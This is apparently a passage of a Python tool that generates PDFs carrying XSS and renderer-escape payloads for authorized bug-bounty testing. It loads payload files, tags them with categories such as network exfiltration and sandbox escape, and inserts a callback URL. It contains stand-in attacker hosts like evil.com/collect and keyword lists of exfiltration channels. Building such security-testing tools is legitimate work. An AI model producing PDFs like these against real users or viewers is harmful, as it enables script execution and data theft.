#!/usr/bin/env python3
"""
 PDF-XSS Generator v4.3

Lean PDF payload generator for renderer-focused, authorized security testing.
It keeps file generation simple and deterministic while treating the payload
database as the primary research surface.
"""

import argparse
import hashlib
import json
import logging
import re
import sys
from collections import Counter, defaultdict
from copy import deepcopy
from datetime import UTC, datetime
from pathlib import Path

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

VERSION = "4.3"
AUTHOR = "SNGWN"
BASE_DIR = Path(__file__).resolve().parent
KNOWN_BROWSERS = ("chrome", "firefox", "safari", "adobe", "edge")
PLACEHOLDER_TOKEN = "{url}"
RUNTIME_GENERATION_KEYS = (
    "default_output_dir",
    "default_pdf_version",
    "max_payloads_per_run",
    "enable_payload_validation",
)
RUNTIME_BROWSER_KEYS = ("name", "json_file", "renderer", "supported_categories")
KNOWN_URL_PATTERNS = (
    r"https?://evil\.com/collect",
    r"https?://test\.com",
    r"https?://webhook\.site/test",
)
KNOWN_URL_TOKENS = ("EXFILTRATION_URL", PLACEHOLDER_TOKEN)
DEFAULT_CONFIG = {
    "generation": {
        "default_output_dir": "Files",
        "default_pdf_version": "1.7",
        "max_payloads_per_run": 100,
        "enable_payload_validation": True,
    },
    "browsers": {
        "chrome": {
            "name": "Chrome/PDFium",
            "json_file": "chrome.json",
            "renderer": "PDFium",
            "supported_categories": ["dom_access", "advanced_evasion", "file_system", "command_execution", "sandbox_escape"],
        },
        "firefox": {
            "name": "Firefox/PDF.js",
            "json_file": "firefox.json",
            "renderer": "PDF.js",
            "supported_categories": ["dom_access", "file_system", "csp_bypass", "network_exfiltration", "advanced_evasion"],
        },
        "safari": {
            "name": "Safari/PDFKit",
            "json_file": "safari.json",
            "renderer": "PDFKit",
            "supported_categories": ["dom_access", "file_system", "webkit_specific", "macos_integration"],
        },
        "adobe": {
            "name": "Adobe Reader/Acrobat",
            "json_file": "adobe.json",
            "renderer": "Acrobat JavaScript",
            "supported_categories": ["api_abuse", "file_system", "network_exfiltration", "privilege_escalation", "advanced_evasion"],
        },
        "edge": {
            "name": "Microsoft Edge/PDFium",
            "json_file": "edge.json",
            "renderer": "PDFium",
            "supported_categories": ["windows_integration", "webview_exploit", "registry_manipulation", "file_system", "advanced_evasion"],
        },
    },
}
CATEGORY_PROFILES = {
    "dom_access": {
        "expected_signal": "dom_navigation_or_ui_change",
        "bug_bounty_value": "high",
        "stability": "high",
        "research_tier": "validation",
    },
    "network_exfiltration": {
        "expected_signal": "controlled_callback",
        "bug_bounty_value": "high",
        "stability": "high",
        "research_tier": "validation",
    },
    "csp_bypass": {
        "expected_signal": "navigation_or_script_execution",
        "bug_bounty_value": "high",
        "stability": "medium",
        "research_tier": "validation",
    },
    "file_system": {
        "expected_signal": "local_resource_probe",
        "bug_bounty_value": "medium",
        "stability": "medium",
        "research_tier": "validation",
    },
    "webkit_specific": {
        "expected_signal": "webkit_bridge_or_handler_activity",
        "bug_bounty_value": "medium",
        "stability": "medium",
        "research_tier": "validation",
    },
    "macos_integration": {
        "expected_signal": "external_handler_launch",
        "bug_bounty_value": "medium",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
    "webview_exploit": {
        "expected_signal": "host_bridge_or_postmessage_activity",
        "bug_bounty_value": "high",
        "stability": "medium",
        "research_tier": "validation",
    },
    "windows_integration": {
        "expected_signal": "external_handler_launch",
        "bug_bounty_value": "medium",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
    "registry_manipulation": {
        "expected_signal": "external_handler_launch",
        "bug_bounty_value": "low",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
    "api_abuse": {
        "expected_signal": "application_api_activity",
        "bug_bounty_value": "medium",
        "stability": "medium",
        "research_tier": "validation",
    },
    "privilege_escalation": {
        "expected_signal": "privileged_api_execution",
        "bug_bounty_value": "low",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
    "advanced_evasion": {
        "expected_signal": "renderer_escape_probe",
        "bug_bounty_value": "medium",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
    "sandbox_escape": {
        "expected_signal": "renderer_escape_probe",
        "bug_bounty_value": "medium",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
    "command_execution": {
        "expected_signal": "external_handler_launch",
        "bug_bounty_value": "low",
        "stability": "experimental",
        "research_tier": "aggressive",
    },
}
PROFILE_DEFINITIONS = {
    "high-signal": "Prioritize the strongest validation and boundary-check payloads for practical bug-bounty work.",
    "blind-oast": "Focus on payloads suited to blind callback, form-submit, or controlled beacon validation.",
    "sbx": "Focus on viewer-boundary, host-bridge, and renderer-escape-adjacent probes.",
    "pdfjs": "Focus on Firefox/PDF.js and hosted viewer-context probes first.",
    "bridge-probes": "Focus on message-handler, WebView, postMessage, and host-bridge validation paths.",
    "upload-preview": "Focus on payloads most useful in inline preview, admin review, and downstream rendering paths.",
    "aggressive-research": "Focus on aggressive and lower-stability research payloads after validation succeeds.",
}
USER_GESTURE_KEYWORDS = (
    "requestdevice",
    "getusermedia",
    "paymentrequest",
    "contacts.select",
    "browsefordoc",
    "app.response",
    ".click(",
)
PDF_TEXT_LINE_LIMIT = 72
PDF_PAGE_HEIGHT = 792
PDF_LEFT_MARGIN = 50
PDF_TOP_MARGIN = 750
PDF_LINE_HEIGHT = 12
PDF_BOTTOM_MARGIN = 40


def setup_logging(log_level=logging.INFO, log_file=None):
    """Create a dedicated logger without duplicating handlers."""
    logger = logging.getLogger("pdf_xss_generator")
    logger.handlers.clear()
    logger.setLevel(log_level)
    logger.propagate = False

    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    handlers = [logging.StreamHandler(sys.stdout)]

    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding="utf-8"))

    for handler in handlers:
        handler.setFormatter(formatter)
        logger.addHandler(handler)

    return logger


logger = setup_logging()


def deep_merge(base, override):
    """Recursively merge dictionaries."""
    merged = deepcopy(base)
    for key, value in (override or {}).items():
        if isinstance(value, dict) and isinstance(merged.get(key), dict):
            merged[key] = deep_merge(merged[key], value)
        else:
            merged[key] = value
    return merged


def pick_known_keys(source, keys):
    """Return only the subset of keys used at runtime."""
    return {key: source[key] for key in keys if key in source}


def normalize_generation_config(generation_config):
    """Reduce generation settings to the fields the generator consumes."""
    merged = deep_merge(DEFAULT_CONFIG["generation"], generation_config or {})
    return pick_known_keys(merged, RUNTIME_GENERATION_KEYS)


def normalize_browser_config(browser, browser_config):
    """Reduce per-browser config to the fields the generator consumes."""
    merged = deep_merge(DEFAULT_CONFIG["browsers"][browser], browser_config or {})
    normalized = pick_known_keys(merged, RUNTIME_BROWSER_KEYS)
    normalized["supported_categories"] = list(normalized.get("supported_categories") or [])
    return normalized


def normalize_runtime_config(config):
    """Drop legacy config surface and keep only runtime-relevant settings."""
    return {
        "generation": normalize_generation_config(config.get("generation", {})),
        "browsers": {
            browser: normalize_browser_config(browser, config.get("browsers", {}).get(browser, {}))
            for browser in KNOWN_BROWSERS
        },
    }


def load_config():
    """Load config.json and merge it with generator defaults."""
    config_path = BASE_DIR / "config.json"
    config = deepcopy(DEFAULT_CONFIG)

    if not config_path.exists():
        return config

    try:
        loaded = json.loads(config_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        logger.warning("Failed to load config.json: %s", error)
        return config

    merged = deep_merge(config, loaded.get("pdf_xss_config", {}))
    return normalize_runtime_config(merged)


def make_parser(config):
    """Build the CLI parser with config-backed defaults."""
    generation = config.get("generation", {})
    browser_choices = list(KNOWN_BROWSERS) + ["all"]

    parser = argparse.ArgumentParser(
        description=(
            "PDF-XSS Generator v4.3 - renderer-aware PDF payload generation "
            "and payload QA"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 pdf_xss_generator.py --list-browsers
  python3 pdf_xss_generator.py --list-profiles
  python3 pdf_xss_generator.py -b chrome -u http://collector.test
  python3 pdf_xss_generator.py -b all -u http://collector.test --profile high-signal --count 12
  python3 pdf_xss_generator.py -b firefox -u http://collector.test --count 10
  python3 pdf_xss_generator.py -b all --validate-payloads --report-file payload_report.json
        """,
    )
    parser.add_argument(
        "-b",
        "--browser",
        choices=browser_choices,
        help="Target browser (required unless using --list-browsers or --validate-payloads without a target)",
    )
    parser.add_argument(
        "-u",
        "--url",
        help="Target URL for controlled callback or navigation checks",
    )
    parser.add_argument(
        "-o",
        "--output-dir",
        default=generation.get("default_output_dir", "Files"),
        help="Output directory for generated PDFs",
    )
    parser.add_argument(
        "--count",
        type=int,
        help="Limit the number of payloads included in the generated PDF",
    )
    parser.add_argument(
        "--pdf-version",
        choices=["1.0", "1.1", "1.2", "1.3", "1.4", "1.5", "1.6", "1.7", "2.0"],
        default=generation.get("default_pdf_version", "1.7"),
        help="PDF version to emit",
    )
    parser.add_argument(
        "--list-browsers",
        action="store_true",
        help="List available browsers and payload counts, then exit",
    )
    parser.add_argument(
        "--list-profiles",
        action="store_true",
        help="List research-backed payload profiles, then exit",
    )
    parser.add_argument(
        "--validate-payloads",
        action="store_true",
        help="Run payload QA and exit without generating a PDF",
    )
    parser.add_argument(
        "--report-file",
        help="Optional JSON report path for --validate-payloads output",
    )
    parser.add_argument(
        "--log-level",
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        default="INFO",
        help="Logging level",
    )
    parser.add_argument(
        "--profile",
        choices=sorted(PROFILE_DEFINITIONS),
        help="Filter generation to a research-backed profile such as high-signal, blind-oast, sbx, or pdfjs",
    )
    parser.add_argument("--log-file", help="Optional log file path")
    return parser


def normalize_placeholder_urls(value):
    """Replace known sample callback URLs with the canonical placeholder token."""
    normalized = str(value)
    for pattern in KNOWN_URL_PATTERNS:
        normalized = re.sub(pattern, PLACEHOLDER_TOKEN, normalized, flags=re.IGNORECASE)
    for token in KNOWN_URL_TOKENS:
        normalized = normalized.replace(token, PLACEHOLDER_TOKEN)
    return normalized


def hash_payload(payload):
    """Create a stable hash for duplicate detection."""
    normalized = normalize_placeholder_urls(payload)
    normalized = re.sub(r"\s+", " ", normalized.lower().strip())
    return hashlib.md5(normalized.encode("utf-8")).hexdigest()


def validate_payload(payload_data):
    """Validate core payload structure."""
    required_fields = [
        "id",
        "category",
        "browser",
        "technique",
        "payload",
        "description",
        "risk_level",
    ]
    for field in required_fields:
        if field not in payload_data:
            return False, f"Missing required field: {field}"

    if len(str(payload_data.get("payload", "")).strip()) < 10:
        return False, "Payload too short"

    return True, "Valid"


def make_issue(level, browser, payload_id, code, message):
    """Create a consistent issue record for validation and logging."""
    return {
        "level": level,
        "browser": browser,
        "id": payload_id,
        "code": code,
        "message": message,
    }


def infer_requires_user_gesture(payload_template):
    """Best-effort indicator for payloads that likely need user interaction."""
    lowered = payload_template.lower()
    if any(keyword in lowered for keyword in USER_GESTURE_KEYWORDS):
        return "possible"
    return "no"


def ensure_list(value):
    """Normalize metadata fields to JSON-friendly lists."""
    if value is None:
        return []
    if isinstance(value, list):
        return value
    return [value]


def normalize_string_list(value):
    """Normalize metadata to a compact list of lowercase strings."""
    items = []
    for item in ensure_list(value):
        text = str(item).strip()
        if text:
            items.append(text)
    return items


def infer_method_family(payload_template, technique, category, browser):
    """Map one payload to a research-backed method family."""
    fingerprint = " ".join([str(payload_template), str(technique), str(category), str(browser)]).lower()

    if any(token in fingerprint for token in ("messagehandlers", "webview.postmessage", "external.notify", "postmessage(")):
        return "bridge_probe"
    if any(token in fingerprint for token in ("submitform", "net.http.request", "fetch(", "xmlhttprequest", "sendbeacon")):
        return "blind_callback"
    if any(token in fingerprint for token in ("parent.location", "top.location", "window.open", "opener", "parent.window", "top.document")):
        return "viewer_boundary_probe"
    if any(token in fingerprint for token in ("file://", "browsefordoc", "saveas", "exportastext")) or category == "file_system":
        return "local_resource_probe"
    if category in {"windows_integration", "macos_integration", "command_execution", "registry_manipulation"} or "launchurl" in fingerprint:
        return "external_handler_probe"
    if browser == "firefox" and category in {"csp_bypass", "dom_access"}:
        return "viewer_context_probe"
    if category in {"advanced_evasion", "sandbox_escape", "privilege_escalation"}:
        return "renderer_escape_probe"
    if category == "api_abuse":
        return "application_api_probe"
    return "navigation_probe"


def infer_blind_channels(payload_template, technique, method_family):
    """Infer how a payload can produce blind proof."""
    fingerprint = " ".join([str(payload_template), str(technique), str(method_family)]).lower()
    channels = []
    if any(token in fingerprint for token in ("fetch(", "xmlhttprequest", "sendbeacon", "net.http.request")):
        channels.append("http")
    if "submitform" in fingerprint:
        channels.extend(["http", "form_submit"])
    if "postmessage(" in fingerprint:
        channels.append("postmessage")
    if "messagehandlers" in fingerprint:
        channels.append("webkit_message_handler")
    if "webview.postmessage" in fingerprint:
        channels.append("webview_bridge")
    if "external.notify" in fingerprint:
        channels.append("external_notify")
    if method_family in {"viewer_boundary_probe", "navigation_probe", "external_handler_probe"}:
        channels.append("navigation")

    ordered = []
    seen = set()
    for channel in channels:
        if channel not in seen:
            seen.add(channel)
            ordered.append(channel)
    return ordered


def infer_boundary_target(payload_template, technique, method_family):
    """Infer the main boundary or bridge the payload is probing."""
    fingerprint = " ".join([str(payload_template), str(technique), str(method_family)]).lower()
    if any(token in fingerprint for token in ("parent", "top", "opener", "window.open")):
        return "viewer_to_parent"
    if any(token in fingerprint for token in ("messagehandlers", "webview.postmessage", "external.notify", "postmessage(")):
        return "viewer_to_host_bridge"
    if any(token in fingerprint for token in ("file://", "browsefordoc", "saveas", "exportastext")):
        return "viewer_to_local_resource"
    if any(token in fingerprint for token in ("launchurl", "ms-settings:", "shell:", "osascript://")):
        return "viewer_to_external_handler"
    if method_family == "application_api_probe":
        return "viewer_to_application_api"
    if method_family == "renderer_escape_probe":
        return "renderer_escape_research"
    return "render_path_validation"


def infer_validation_stage(method_family, research_tier, blind_channels):
    """Classify payloads into a simple testing stage."""
    if research_tier == "aggressive":
        return "aggressive_research"
    if blind_channels:
        return "blind_validation"
    if method_family in {"viewer_boundary_probe", "bridge_probe", "viewer_context_probe"}:
        return "boundary_validation"
    return "initial_validation"


def infer_signal_strength(method_family, bug_bounty_value, evidence_level):
    """Rank payload usefulness for practical hunting."""
    if evidence_level == "high" or method_family in {"blind_callback", "bridge_probe", "viewer_boundary_probe", "viewer_context_probe"}:
        return "high"
    if bug_bounty_value == "high":
        return "high"
    if bug_bounty_value == "medium":
        return "medium"
    return "research"


def build_source_tags(browser, renderer, method_family, validation_stage, blind_channels):
    """Build compact source tags for reporting and filtering."""
    renderer_tag = str(renderer).lower().replace("/", "_").replace(" ", "_")
    tags = [browser, renderer_tag, method_family, validation_stage]
    tags.extend(blind_channels)
    ordered = []
    seen = set()
    for tag in tags:
        if tag not in seen:
            seen.add(tag)
            ordered.append(tag)
    return ordered


def infer_profile_tags(normalized_payload):
    """Assign lightweight profile tags used by CLI filtering."""
    tags = set()
    if normalized_payload["signal_strength"] == "high":
        tags.add("high-signal")
    if normalized_payload["blind_channels"]:
        tags.add("blind-oast")
    if normalized_payload["research_tier"] == "aggressive":
        tags.add("aggressive-research")
    if normalized_payload["browser"] == "firefox":
        tags.add("pdfjs")
    if normalized_payload["method_family"] == "bridge_probe" or normalized_payload["boundary_target"] == "viewer_to_host_bridge":
        tags.add("bridge-probes")
    if normalized_payload["boundary_target"] != "render_path_validation" or normalized_payload["method_family"] in {
        "viewer_boundary_probe",
        "viewer_context_probe",
        "renderer_escape_probe",
        "external_handler_probe",
    }:
        tags.add("sbx")
    if any(path in {"inline_preview", "admin_review", "embedded_viewer", "conversion_pipeline"} for path in normalized_payload["delivery_paths"]):
        tags.add("upload-preview")
    return sorted(tags)


def normalize_payload_entry(payload_data, browser, browser_metadata, supported_categories):
    """Normalize one payload into a renderer-aware record."""
    normalized = dict(payload_data)
    payload_template = normalize_placeholder_urls(normalized.get("payload", ""))
    category = normalized.get("category", "unknown")
    profile = CATEGORY_PROFILES.get(category, {})
    defaults = browser_metadata.get("default_payload_metadata", {})
    issues = []
    source_id = str(normalized.get("id", "")).strip() or "missing_id"

    if normalized.get("browser") and normalized.get("browser") != browser:
        issues.append(
            make_issue(
                "warning",
                browser,
                source_id,
                "browser_mismatch",
                f"Payload browser '{normalized.get('browser')}' did not match '{browser}'",
            )
        )

    if supported_categories and category not in supported_categories:
        issues.append(
            make_issue(
                "warning",
                browser,
                source_id,
                "unsupported_category",
                f"Category '{category}' is not declared for {browser}",
            )
        )

    if payload_template != normalized.get("payload", ""):
        issues.append(
            make_issue(
                "warning",
                browser,
                source_id,
                "hardcoded_url_normalized",
                "Replaced a hardcoded callback URL with the canonical {url} placeholder",
            )
        )

    normalized["browser"] = browser
    normalized["source_id"] = source_id
    normalized["payload"] = payload_template
    normalized["renderer"] = normalized.get("renderer") or browser_metadata.get("renderer", "unknown")
    normalized["trigger"] = normalized.get("trigger") or defaults.get("trigger", "document_open")
    normalized["requires_user_gesture"] = normalized.get("requires_user_gesture") or defaults.get(
        "requires_user_gesture",
        infer_requires_user_gesture(payload_template),
    )
    normalized["expected_signal"] = normalized.get("expected_signal") or defaults.get(
        "expected_signal",
        profile.get("expected_signal", "renderer_activity"),
    )
    normalized["preconditions"] = ensure_list(
        normalized.get("preconditions") or defaults.get("preconditions", ["JavaScript enabled in PDF viewer"])
    )
    normalized["bug_bounty_value"] = normalized.get("bug_bounty_value") or defaults.get(
        "bug_bounty_value",
        profile.get("bug_bounty_value", "medium"),
    )
    normalized["stability"] = normalized.get("stability") or defaults.get(
        "stability",
        profile.get("stability", "experimental"),
    )
    normalized["research_tier"] = normalized.get("research_tier") or defaults.get(
        "research_tier",
        profile.get("research_tier", "validation"),
    )
    normalized["delivery_paths"] = normalize_string_list(
        normalized.get("delivery_paths") or defaults.get("delivery_paths") or browser_metadata.get("preferred_delivery_paths")
    )
    normalized["host_context"] = normalized.get("host_context") or defaults.get(
        "host_context",
        browser_metadata.get("host_context", "embedded_pdf_viewer"),
    )
    normalized["evidence_level"] = normalized.get("evidence_level") or defaults.get(
        "evidence_level",
        browser_metadata.get("evidence_level", "medium"),
    )
    normalized["method_family"] = normalized.get("method_family") or defaults.get(
        "method_family",
        infer_method_family(payload_template, normalized.get("technique"), category, browser),
    )
    normalized["blind_channels"] = normalize_string_list(
        normalized.get("blind_channels")
        or defaults.get("blind_channels")
        or infer_blind_channels(payload_template, normalized.get("technique"), normalized["method_family"])
    )
    normalized["boundary_target"] = normalized.get("boundary_target") or defaults.get(
        "boundary_target",
        infer_boundary_target(payload_template, normalized.get("technique"), normalized["method_family"]),
    )
    normalized["validation_stage"] = normalized.get("validation_stage") or defaults.get(
        "validation_stage",
        infer_validation_stage(normalized["method_family"], normalized["research_tier"], normalized["blind_channels"]),
    )
    normalized["signal_strength"] = normalized.get("signal_strength") or defaults.get(
        "signal_strength",
        infer_signal_strength(normalized["method_family"], normalized["bug_bounty_value"], normalized["evidence_level"]),
    )
    normalized["source_tags"] = normalize_string_list(
        normalized.get("source_tags")
        or defaults.get("source_tags")
        or build_source_tags(
            browser,
            normalized["renderer"],
            normalized["method_family"],
            normalized["validation_stage"],
            normalized["blind_channels"],
        )
    )
    normalized["payload_hash"] = hash_payload(payload_template)
    normalized["profile_tags"] = infer_profile_tags(normalized)
    return normalized, issues


def load_browser_payloads(browser, config):
    """Load, normalize, and validate one browser payload file."""
    browser_config = config.get("browsers", {}).get(browser, {})
    json_filename = browser_config.get("json_file", f"{browser}.json")
    payload_path = BASE_DIR / json_filename
    supported_categories = set(browser_config.get("supported_categories", []))

    if not payload_path.exists():
        return {
            "browser": browser,
            "metadata": {},
            "payloads": [],
            "issues": [
                make_issue("error", browser, None, "missing_file", f"Payload file not found: {json_filename}")
            ],
        }

    try:
        data = json.loads(payload_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as error:
        return {
            "browser": browser,
            "metadata": {},
            "payloads": [],
            "issues": [
                make_issue("error", browser, None, "invalid_json", f"Invalid JSON in {json_filename}: {error}")
            ],
        }
    except OSError as error:
        return {
            "browser": browser,
            "metadata": {},
            "payloads": [],
            "issues": [
                make_issue("error", browser, None, "read_error", f"Cannot read {json_filename}: {error}")
            ],
        }

    metadata = deep_merge(browser_config, data.get("metadata", {}))
    raw_payloads = data.get("payloads", [])
    normalized_payloads = []
    issues = []
    seen_ids = Counter()
    hash_to_ids = defaultdict(list)

    for raw_payload in raw_payloads:
        is_valid, message = validate_payload(raw_payload)
        payload_id = raw_payload.get("id")
        if not is_valid:
            issues.append(make_issue("error", browser, payload_id, "invalid_payload", message))
            continue

        payload, payload_issues = normalize_payload_entry(
            raw_payload,
            browser,
            metadata,
            supported_categories,
        )
        issues.extend(payload_issues)

        seen_ids[payload["source_id"]] += 1
        if seen_ids[payload["source_id"]] > 1:
            payload["id"] = f"{payload['source_id']}__dup{seen_ids[payload['source_id']] - 1}"
            issues.append(
                make_issue(
                    "warning",
                    browser,
                    payload["source_id"],
                    "duplicate_id",
                    f"Duplicate source ID normalized to {payload['id']}",
                )
            )
        else:
            payload["id"] = payload["source_id"]

        hash_to_ids[payload["payload_hash"]].append(payload["id"])
        normalized_payloads.append(payload)

    for payload_hash, payload_ids in hash_to_ids.items():
        if len(payload_ids) > 1:
            issues.append(
                make_issue(
                    "warning",
                    browser,
                    ",".join(payload_ids),
                    "duplicate_payload_hash",
                    f"Normalized payload hash {payload_hash} is shared by {', '.join(payload_ids)}",
                )
            )

    logger.debug("Loaded %s payloads for %s from %s", len(normalized_payloads), browser, json_filename)
    return {
        "browser": browser,
        "metadata": metadata,
        "payloads": normalized_payloads,
        "issues": issues,
    }


def select_browsers(selected_browser):
    """Expand the user's browser choice into a browser list."""
    if selected_browser in (None, "all"):
        return list(KNOWN_BROWSERS)
    return [selected_browser]


def resolve_selected_browser(args, parser):
    """Resolve the effective browser selection for the current command."""
    if not args.browser and args.validate_payloads:
        return "all"
    if not args.browser and args.profile == "pdfjs":
        return "firefox"
    if not args.browser:
        parser.error("Browser selection required. Use -b/--browser or --list-browsers")
    return args.browser


def validate_cli_requirements(args, parser):
    """Enforce CLI argument requirements shared across execution paths."""
    if args.list_browsers or args.list_profiles:
        return
    if not args.validate_payloads and not args.url:
        parser.error("Target URL is required unless using --list-browsers or --validate-payloads")


def load_selected_datasets(selected_browser, config):
    """Load datasets for the effective browser selection."""
    return [load_browser_payloads(browser, config) for browser in select_browsers(selected_browser)]


def collect_payload_artifacts(datasets):
    """Flatten payload and issue collections from loaded datasets."""
    payloads = []
    issues = []
    for dataset in datasets:
        payloads.extend(dataset["payloads"])
        issues.extend(dataset["issues"])
    return payloads, issues


def filter_payloads_by_profile(payloads, profile):
    """Return only payloads that match the requested research profile."""
    if not profile:
        return payloads
    return [payload for payload in payloads if profile in payload.get("profile_tags", [])]


def count_issues(issues, level):
    """Count issues for one severity level."""
    return sum(1 for issue in issues if issue["level"] == level)


def summarize_issue_counts(issues):
    """Count issues by code for compact logging."""
    summary = Counter(issue["code"] for issue in issues)
    return ", ".join(f"{code}={count}" for code, count in sorted(summary.items()))


def list_available_browsers(config):
    """List available browsers and payload counts without requiring a target URL."""
    print("📊 AVAILABLE BROWSERS AND PAYLOAD COUNTS:")
    print("=" * 52)
    for browser in KNOWN_BROWSERS:
        dataset = load_browser_payloads(browser, config)
        name = dataset["metadata"].get("name", browser)
        renderer = dataset["metadata"].get("renderer", "unknown")
        issue_count = len([issue for issue in dataset["issues"] if issue["level"] == "error"])
        if issue_count:
            print(f"❌ {browser:<8} - {name} ({renderer}) - error loading payloads")
            continue
        print(
            f"✅ {browser:<8} - {len(dataset['payloads']):>3} payloads - "
            f"{name} [{renderer}]"
        )
        recommended_profiles = ", ".join(dataset["metadata"].get("recommended_profiles", []))
        if recommended_profiles:
            print(f"  profiles     : {recommended_profiles}")
        delivery_paths = ", ".join(dataset["metadata"].get("preferred_delivery_paths", [])[:3])
        if delivery_paths:
            print(f"  paths        : {delivery_paths}")
        sbx_focus = dataset["metadata"].get("sbx_focus", [])
        if sbx_focus:
            print(f"  sbx focus    : {sbx_focus[0]}")


def list_available_profiles():
    """List the profile filters that encode the research workflow."""
    print("🎯 AVAILABLE RESEARCH PROFILES:")
    print("=" * 52)
    for profile, description in PROFILE_DEFINITIONS.items():
        print(f"- {profile:<18} {description}")


def build_payload_report(datasets):
    """Create a machine-readable payload QA report."""
    report = {
        "version": VERSION,
        "generated_at": datetime.now(UTC).isoformat(),
        "summary": {
            "total_browsers": len(datasets),
            "total_payloads": 0,
            "warning_count": 0,
            "error_count": 0,
        },
        "browsers": {},
    }

    for dataset in datasets:
        browser = dataset["browser"]
        payloads = dataset["payloads"]
        issues = dataset["issues"]
        issue_counts = Counter(issue["level"] for issue in issues)
        report["summary"]["total_payloads"] += len(payloads)
        report["summary"]["warning_count"] += issue_counts.get("warning", 0)
        report["summary"]["error_count"] += issue_counts.get("error", 0)
        report["browsers"][browser] = {
            "renderer": dataset["metadata"].get("renderer", "unknown"),
            "payload_count": len(payloads),
            "categories": dict(Counter(payload["category"] for payload in payloads)),
            "risk_levels": dict(Counter(payload["risk_level"] for payload in payloads)),
            "research_tiers": dict(Counter(payload["research_tier"] for payload in payloads)),
            "method_families": dict(Counter(payload["method_family"] for payload in payloads)),
            "profiles": dict(Counter(tag for payload in payloads for tag in payload.get("profile_tags", []))),
            "issue_counts": dict(issue_counts),
            "issues": issues,
        }

    return report


def print_payload_report(report):
    """Render a compact payload QA summary."""
    summary = report["summary"]
    print("📋 PAYLOAD QA SUMMARY")
    print("=" * 52)
    print(f"Total payloads : {summary['total_payloads']}")
    print(f"Warnings       : {summary['warning_count']}")
    print(f"Errors         : {summary['error_count']}")
    print("")

    for browser in KNOWN_BROWSERS:
        browser_report = report["browsers"].get(browser)
        if not browser_report:
            continue
        print(
            f"- {browser:<8} renderer={browser_report['renderer']:<14} "
            f"payloads={browser_report['payload_count']:<3} "
            f"warnings={browser_report['issue_counts'].get('warning', 0):<3} "
            f"errors={browser_report['issue_counts'].get('error', 0):<3}"
        )
        if browser_report["categories"]:
            categories = ", ".join(
                f"{category}={count}"
                for category, count in sorted(browser_report["categories"].items())
            )
            print(f"  categories   : {categories}")
        if browser_report["research_tiers"]:
            tiers = ", ".join(
                f"{tier}={count}"
                for tier, count in sorted(browser_report["research_tiers"].items())
            )
            print(f"  tiers        : {tiers}")
        if browser_report["method_families"]:
            methods = ", ".join(
                f"{method}={count}"
                for method, count in sorted(browser_report["method_families"].items())
            )
            print(f"  methods      : {methods}")
        if browser_report["profiles"]:
            profiles = ", ".join(
                f"{profile}={count}"
                for profile, count in sorted(browser_report["profiles"].items())
            )
            print(f"  profiles     : {profiles}")


def save_report(report, report_file):
    """Persist a JSON payload QA report."""
    report_path = Path(report_file)
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    logger.info("Payload QA report written to %s", report_path)


def run_validation_mode(datasets, report_file):
    """Run payload QA mode and return the process exit code."""
    report = build_payload_report(datasets)
    print_payload_report(report)
    if report_file:
        save_report(report, report_file)
    return 1 if report["summary"]["error_count"] else 0


def substitute_url_in_payload(payload, target_url):
    """Replace the canonical URL placeholder with the user-supplied target."""
    return normalize_placeholder_urls(payload).replace(PLACEHOLDER_TOKEN, target_url)


def sanitize_pdf_text(value):
    """Reduce a value to safe PDF literal string content."""
    text = str(value)
    text = text.replace("\\", "\\\\")
    text = text.replace("(", "\\(").replace(")", "\\)")
    text = text.replace("\r", "\\r").replace("\n", "\\n")
    return text.encode("ascii", "replace").decode("ascii")


def pdf_literal_string(value):
    """Encode a string as a PDF literal string."""
    return f"({sanitize_pdf_text(value)})"


def wrap_text_for_pdf(text, max_chars_per_line=PDF_TEXT_LINE_LIMIT):
    """Wrap text conservatively for single-column PDF rendering."""
    if not text:
        return []

    words = str(text).split()
    if not words:
        return [""]

    lines = []
    current_line = ""
    for word in words:
        candidate = word if not current_line else f"{current_line} {word}"
        if len(candidate) <= max_chars_per_line:
            current_line = candidate
            continue

        if current_line:
            lines.append(current_line)
            current_line = word
        else:
            lines.append(word[:max_chars_per_line])
            current_line = word[max_chars_per_line:]

    if current_line:
        lines.append(current_line)

    return lines


def build_page_lines(payload, index, target_url):
    """Create renderer-focused page content for one payload."""
    runtime_payload = substitute_url_in_payload(payload["payload"], target_url)
    display_record = {
        "id": payload["id"],
        "source_id": payload["source_id"],
        "browser": payload["browser"],
        "renderer": payload["renderer"],
        "category": payload["category"],
        "technique": payload["technique"],
        "risk_level": payload["risk_level"],
        "research_tier": payload["research_tier"],
        "validation_stage": payload["validation_stage"],
        "signal_strength": payload["signal_strength"],
        "method_family": payload["method_family"],
        "trigger": payload["trigger"],
        "requires_user_gesture": payload["requires_user_gesture"],
        "expected_signal": payload["expected_signal"],
        "bug_bounty_value": payload["bug_bounty_value"],
        "stability": payload["stability"],
        "delivery_paths": payload["delivery_paths"],
        "blind_channels": payload["blind_channels"],
        "host_context": payload["host_context"],
        "boundary_target": payload["boundary_target"],
        "evidence_level": payload["evidence_level"],
        "profile_tags": payload["profile_tags"],
        "source_tags": payload["source_tags"],
        "preconditions": payload["preconditions"],
        "payload_hash": payload["payload_hash"],
        "description": payload["description"],
        "payload": runtime_payload,
    }
    if payload.get("cve_reference"):
        display_record["cve_reference"] = payload["cve_reference"]

    lines = [
        f"Payload #{index + 1}",
        f"ID: {payload['id']} | Renderer: {payload['renderer']} | Tier: {payload['research_tier']}",
        f"Technique: {payload['technique']} | Method: {payload['method_family']}",
        f"Signal: {payload['expected_signal']} | Strength: {payload['signal_strength']} | Risk: {payload['risk_level']}",
        f"Stage: {payload['validation_stage']} | Boundary: {payload['boundary_target']}",
        f"Blind channels: {', '.join(payload['blind_channels']) or 'none'} | User gesture: {payload['requires_user_gesture']}",
        "Normalized payload record:",
        "========================================",
    ]

